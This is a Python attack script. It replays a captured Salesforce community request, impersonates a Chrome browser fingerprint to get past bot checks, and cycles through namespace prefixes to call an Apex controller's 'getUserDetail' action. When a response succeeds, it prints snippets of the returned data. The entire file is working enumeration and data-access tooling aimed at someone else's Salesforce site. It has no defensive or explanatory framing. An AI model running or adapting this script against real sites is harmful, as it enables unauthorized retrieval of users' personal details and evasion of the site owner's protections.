import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading captured request structure...")
with open("captured_feed_request.json", "r") as f:
    base_req = json.load(f)

url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]
parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# Proven working controller name
base_controller = "OLC_BreadcrumbController"
method = "getUserDetail"

# Common Salesforce namespace prefixes
namespaces = ["c", "siteforce", "sfsites", "okta", "support", "communities", "force"]

session = requests.Session()
print(f"[*] Testing namespace variations for {base_controller}...")

for ns in namespaces:
    descriptor = f"apex://{ns}__{base_controller}/ACTION${method}"
    
    message_obj = {
        "actions": [
            {
                "id": "333;a",
                "descriptor": descriptor,
                "callingDescriptor": "UNKNOWN",
                "params": {}
            }
        ]
    }
    
    parsed_data["message"] = json.dumps(message_obj)
    new_post_data = urllib.parse.urlencode(parsed_data)
    
    try:
        res = session.post(url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=5)
        if res.status_code == 200:
            if '"state":"SUCCESS"' in res.text:
                print(f"    [🔥] SUCCESS WITH NAMESPACE [{ns}]: {descriptor}")
                print(f"    [🔥] Snippet: {res.text[:300]}")
            else:
                print(f"    [+] Response received for [{ns}]: Length {len(res.text)}")
    except Exception as e:
        pass

print("[+] Namespace fuzzing complete.")

